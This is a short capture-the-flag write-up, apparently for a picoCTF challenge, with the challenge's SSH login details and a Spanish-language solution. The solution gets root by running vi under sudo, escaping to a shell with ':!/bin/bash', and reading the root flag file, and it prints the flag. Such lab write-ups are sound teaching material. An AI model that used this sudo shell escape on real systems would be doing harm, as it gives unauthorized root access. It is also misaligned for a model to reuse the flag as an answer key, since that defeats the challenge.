Can you read files in the root file?
The system admin has provisioned an account for you on the main server:`ssh -p 55267 picoplayer@saturn.picoctf.net`Password: `e3pn6lmvHt`Can you login and read the root file?

Hints:
1. What permissions do you have?

## Solución 1:
Nos conectamos con SSH y ejecutamos un script usando vim
```
picoplayer@challenge:~$ sudo vi test
[sudo] password for picoplayer:

#Vim
:!/bin/bash
#Vim

root@challenge:/home/picoplayer# whoami
root      
root@challenge:/challenge# cd /root/
root@challenge:~# ls -a
.  ..  .bashrc  .flag.txt  .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
```